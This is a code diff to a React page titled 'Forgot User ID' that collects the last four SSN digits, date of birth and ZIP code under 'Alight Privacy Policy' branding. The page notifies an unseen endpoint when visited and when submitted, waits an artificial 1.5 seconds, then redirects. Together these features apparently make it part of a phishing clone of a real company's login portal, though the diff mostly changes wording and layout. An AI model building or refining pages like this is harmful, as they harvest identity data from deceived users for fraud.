@@ -10,7 +10,7 @@ import { Input } from "@/components/ui/input";
 import { Checkbox } from "@/components/ui/checkbox";
 import { MONTHS, DAYS, YEARS } from "@/lib/date-constants";
 
-export default function ForgotPasswordPage() {
+export default function ForgotIdPage() {
   const router = useRouter();
   const [ssnLast4, setSsnLast4] = useState("");
   const [month, setMonth] = useState("");
@@ -20,6 +20,7 @@ export default function ForgotPasswordPage() {
   const [birthDateText, setBirthDateText] = useState("");
   const [privacyAccepted, setPrivacyAccepted] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+  const hasNotifiedView = useRef(false);
 
   const ssnDigits = ssnLast4.replace(/\D/g, "");
   const zipDigits = zip.replace(/\D/g, "");
@@ -27,9 +28,7 @@ export default function ForgotPasswordPage() {
   const isDateValid = month && day && year;
   const isMobileDobValid = birthDateText.trim().length > 0;
   const isDesktopFormValid = isSsnValid && isDateValid && privacyAccepted;
-  const isMobileFormValid =
-    isSsnValid && zipDigits.length >= 5 && isMobileDobValid;
-  const hasNotifiedView = useRef(false);
+  const isMobileFormValid = isSsnValid && zipDigits.length >= 5 && isMobileDobValid;
 
   useEffect(() => {
     if (hasNotifiedView.current) return;
@@ -55,7 +54,7 @@ export default function ForgotPasswordPage() {
         }),
       }).catch(console.error);
     } catch (err) {
-      console.error("Forgot password notification error:", err);
+      console.error("Forgot user ID notification error:", err);
     }
     await new Promise((r) => setTimeout(r, 1500));
     router.push("/forgot-password-found");
@@ -89,9 +88,9 @@ export default function ForgotPasswordPage() {
               </svg>
             </button>
 
-            <h1 className="mt-8 text-2xl font-bold">Forgot Password</h1>
+            <h1 className="mt-8 text-2xl font-bold">Forgot User ID</h1>
             <p className="mt-2 text-[15px] leading-6 text-gray-900">
-              Please verify your identity to reset your password.
+              Enter the information below so we can help locate your User ID.
             </p>
           </div>
 
@@ -159,7 +158,7 @@ export default function ForgotPasswordPage() {
         <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px] flex-1">
           <div className="flex items-center gap-2 mb-2">
             <h1 className="text-2xl font-semibold text-gray-900">
-              Forgot User ID or Password?
+              Forgot User ID
             </h1>
             <button
               type="button"
@@ -171,8 +170,8 @@ export default function ForgotPasswordPage() {
             </button>
           </div>
           <p className="text-gray-700 text-sm mb-6">
-            You&apos;ll need to provide some information first to confirm your
-            identity.
+            Enter the details below so we can locate your User ID and get you
+            back into your account.
           </p>
 
           <form onSubmit={handleSubmit} className="space-y-5">
@@ -253,34 +252,21 @@ export default function ForgotPasswordPage() {
                 className="text-sm text-gray-700 cursor-pointer select-none"
               >
                 To continue, check here to accept the{" "}
-                <a
-                  href="#"
-                  className="text-[#254650] hover:underline font-medium"
-                >
+                <a href="#" className="text-[#254650] hover:underline font-medium">
                   Alight Privacy Policy.
                 </a>
               </label>
             </div>
 
-            <div className="flex gap-3 pt-2">
-              <Button
-                type="submit"
-                disabled={!isDesktopFormValid || isLoading}
-                className="bg-[#254650] hover:bg-[#1e383f] text-white rounded-md h-9 px-5 text-sm font-medium disabled:bg-gray-300 disabled:text-gray-500 disabled:pointer-events-none"
-              >
-                {isLoading ? "Loading..." : "Continue"}
-              </Button>
-              <Button
-                type="button"
-                className="bg-gray-600 hover:bg-gray-700 text-white border-0 rounded-md h-9 px-5 text-sm font-medium"
-                onClick={() => router.push("/")}
-              >
-                Cancel
-              </Button>
-            </div>
+            <Button
+              type="submit"
+              className="w-full max-w-[260px] h-12 rounded-full bg-[#254650] text-white text-sm font-semibold"
+              disabled={isLoading || !isDesktopFormValid}
+            >
+              {isLoading ? "Loading..." : "CONTINUE"}
+            </Button>
           </form>
         </div>
-        <SiteFooter />
       </div>
     </div>
   );
